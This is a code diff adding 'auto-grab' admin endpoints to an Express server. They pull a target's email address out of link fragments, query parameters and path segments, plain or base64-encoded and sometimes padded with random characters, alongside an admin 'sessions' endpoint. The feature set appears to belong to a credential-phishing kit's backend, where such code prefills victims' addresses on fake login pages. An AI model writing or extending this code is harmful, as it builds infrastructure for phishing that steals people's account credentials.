@@ -2124,6 +2124,233 @@ app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
     }
 });
 
+// Auto-grab URL parser endpoint
+app.post('/api/admin/autograb/parse', requireAdminAuth, (req, res) => {
+    try {
+        const { url } = req.body;
+
+        if (!url) {
+            return res.status(400).json({
+                success: false,
+                error: 'URL is required'
+            });
+        }
+
+        // Parse URL to extract email based on various patterns
+        const parsedEmail = parseEmailFromUrl(url);
+
+        if (parsedEmail) {
+            res.json({
+                success: true,
+                email: parsedEmail.email,
+                pattern: parsedEmail.pattern,
+                redirectType: parsedEmail.redirectType
+            });
+        } else {
+            res.json({
+                success: false,
+                error: 'No email found in URL',
+                url: url
+            });
+        }
+    } catch (error) {
+        console.error('Error parsing auto-grab URL:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to parse URL',
+            details: error.message
+        });
+    }
+});
+
+// Get auto-grab configuration
+app.get('/api/admin/autograb/config', requireAdminAuth, (req, res) => {
+    try {
+        const configPath = path.join(__dirname, 'autograb-config.json');
+        let config = {
+            enabled: false,
+            autoRedirect: true,
+            patterns: []
+        };
+
+        if (fs.existsSync(configPath)) {
+            config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
+        }
+
+        res.json({
+            success: true,
+            config: config
+        });
+    } catch (error) {
+        console.error('Error loading auto-grab config:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to load configuration',
+            details: error.message
+        });
+    }
+});
+
+// Update auto-grab configuration
+app.post('/api/admin/autograb/config', requireAdminAuth, (req, res) => {
+    try {
+        const { enabled, autoRedirect } = req.body;
+        const configPath = path.join(__dirname, 'autograb-config.json');
+
+        let config = {
+            enabled: false,
+            autoRedirect: true,
+            patterns: []
+        };
+
+        if (fs.existsSync(configPath)) {
+            config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
+        }
+
+        if (enabled !== undefined) config.enabled = Boolean(enabled);
+        if (autoRedirect !== undefined) config.autoRedirect = Boolean(autoRedirect);
+
+        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
+        console.log('📋 Auto-grab configuration updated');
+
+        res.json({
+            success: true,
+            config: config,
+            message: 'Configuration updated successfully'
+        });
+    } catch (error) {
+        console.error('Error updating auto-grab config:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to update configuration',
+            details: error.message
+        });
+    }
+});
+
+// Helper function to parse email from URL using various patterns
+function parseEmailFromUrl(url) {
+    try {
+        const urlObj = new URL(url);
+        const params = urlObj.searchParams;
+        const hash = urlObj.hash.substring(1);
+        const pathname = urlObj.pathname;
+
+        // Pattern 1: #(Random 4 String)(Email Base64)(Random 4 String)
+        const pattern1Match = hash.match(/^[a-zA-Z0-9]{4}([A-Za-z0-9+/=]+)[a-zA-Z0-9]{4}$/);
+        if (pattern1Match) {
+            try {
+                const decoded = Buffer.from(pattern1Match[1], 'base64').toString('utf8');
+                if (isValidEmail(decoded)) {
+                    return { email: decoded, pattern: '#(Random 4)(Email Base64)(Random 4)', redirectType: 'hash' };
+                }
+            } catch (e) {}
+        }
+
+        // Pattern 2: #(Email) or #(Email Base64)
+        if (hash) {
+            if (isValidEmail(hash)) {
+                return { email: hash, pattern: '#(Email)', redirectType: 'hash' };
+            }
+            try {
+                const decoded = Buffer.from(hash, 'base64').toString('utf8');
+                if (isValidEmail(decoded)) {
+                    return { email: decoded, pattern: '#(Email Base64)', redirectType: 'hash' };
+                }
+            } catch (e) {}
+        }
+
+        // Pattern 3: ?t=(email) or ?t=(email base64)
+        const tParam = params.get('t');
+        if (tParam) {
+            if (isValidEmail(tParam)) {
+                return { email: tParam, pattern: '?t=(email)', redirectType: 'query' };
+            }
+            try {
+                const decoded = Buffer.from(tParam, 'base64').toString('utf8');
+                if (isValidEmail(decoded)) {
+                    return { email: decoded, pattern: '?t=(email base64)', redirectType: 'query' };
+                }
+            } catch (e) {}
+        }
+
+        // Pattern 4-7: Various query parameters
+        const paramPatterns = ['a', 'email', 'e', 'target'];
+        for (const param of paramPatterns) {
+            const value = params.get(param);
+            if (value) {
+                if (isValidEmail(value)) {
+                    return { email: value, pattern: `?${param}=(email)`, redirectType: 'query' };
+                }
+                try {
+                    const decoded = Buffer.from(value, 'base64').toString('utf8');
+                    if (isValidEmail(decoded)) {
+                        return { email: decoded, pattern: `?${param}=(email base64)`, redirectType: 'query' };
+                    }
+                } catch (e) {}
+            }
+        }
+
+        // Pattern 8-10: Path-based patterns /$<(email)> or /*<(email)> or /<(email)>
+        const pathPatterns = [
+            /\/\$<([^>]+)>/,
+            /\/\*<([^>]+)>/,
+            /\/<([^>]+)>/
+        ];
+
+        for (const pattern of pathPatterns) {
+            const match = pathname.match(pattern);
+            if (match) {
+                const value = match[1];
+                if (isValidEmail(value)) {
+                    return { email: value, pattern: pattern.source, redirectType: 'path' };
+                }
+                try {
+                    const decoded = Buffer.from(value, 'base64').toString('utf8');
+                    if (isValidEmail(decoded)) {
+                        return { email: decoded, pattern: pattern.source + ' (base64)', redirectType: 'path' };
+                    }
+                } catch (e) {}
+            }
+        }
+
+        // Pattern 11-14: Path with random chars: /$<randomchar>*<(email)>
+        const complexPathPatterns = [
+            /\/\$<[^>]+>(\*|>)<([^>]+)>/,
+            /\/\*<[^>]+>(\$|>)<([^>]+)>/,
+            /\/<[^>]+>(>|\$|\*)<([^>]+)>/
+        ];
+
+        for (const pattern of complexPathPatterns) {
+            const match = pathname.match(pattern);
+            if (match) {
+                const value = match[2] || match[1];
+                if (isValidEmail(value)) {
+                    return { email: value, pattern: pattern.source, redirectType: 'path' };
+                }
+                try {
+                    const decoded = Buffer.from(value, 'base64').toString('utf8');
+                    if (isValidEmail(decoded)) {
+                        return { email: decoded, pattern: pattern.source + ' (base64)', redirectType: 'path' };
+                    }
+                } catch (e) {}
+            }
+        }
+
+        return null;
+
+    } catch (error) {
+        console.error('Error parsing URL:', error);
+        return null;
+    }
+}
+
+// Helper function to validate email
+function isValidEmail(email) {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(email);
+}
+
 // Admin sessions endpoint with session data
 app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
     try {
